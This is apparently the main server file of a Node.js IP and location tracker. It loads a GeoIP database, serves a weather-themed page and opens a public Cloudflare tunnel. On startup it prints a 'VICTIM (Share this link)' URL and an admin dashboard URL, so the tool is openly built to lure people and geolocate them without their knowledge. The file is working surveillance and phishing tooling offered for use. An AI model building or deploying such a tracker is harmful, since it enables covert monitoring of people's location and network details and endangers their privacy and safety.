const { tunnel: cloudflaredTunnel } = require("cloudflared")
const cookieParser = require("cookie-parser")
const socketIO = require("socket.io")
const maxmind = require("maxmind")
const path = require("path")
const fs = require("fs")
const config = require("./config")
const express = require("express")
const tarkine = require("tarkine")
const http = require('http')

const app = express()
const server = http.createServer(app)
const io = new socketIO.Server(server)
const PORT = process.env.PORT || config.port
global.remoteURL
global.geoipReader = null

global.IO = io

app.set("view engine", "html")
app.engine("html", tarkine.renderFile)
app.use(cookieParser())
app.use(express.urlencoded({ extended: false }))
app.use(express.static(__dirname + "/public"))
app.use(express.json())

app.use("/", require("./router"))
app.use("/", require("./liveweather"))

server.listen(PORT, async () => {
    // Initialize GeoIP reader
    const dbPath = path.join(__dirname, "geoip", "GeoLite2-City.mmdb")
    if (fs.existsSync(dbPath)) {
        try {
            global.geoipReader = await maxmind.open(dbPath)
            console.log("✅ GeoIP database loaded successfully")
        } catch (error) {
            console.warn("⚠️  GeoIP database load failed:", error.message)
        }
    } else {
        console.warn("⚠️  GeoIP database not found at", dbPath)
        console.log("📥 Download from: https://dev.maxmind.com/geoip/geolite2-city/")
    }

    const localURL = `http://localhost:${PORT}`
    remoteURL = await cloudflaredTunnel({
        "--url": localURL
    }).url

    console.log(`\n=== TRACKER LINKS ===`)
    console.log(`\n🎯 VICTIM (Share this link):`)
    console.log(`   LOCAL:  ${localURL}`)
    console.log(`   REMOTE: ${remoteURL}`)
    console.log(`\n👁️  ADMIN DASHBOARD:`)
    console.log(`   LOCAL:  ${localURL}/admin?key=${config.adminKey}`)
    console.log(`   REMOTE: ${remoteURL}/admin?key=${config.adminKey}`)
    console.log(`\n=====================\n`)
})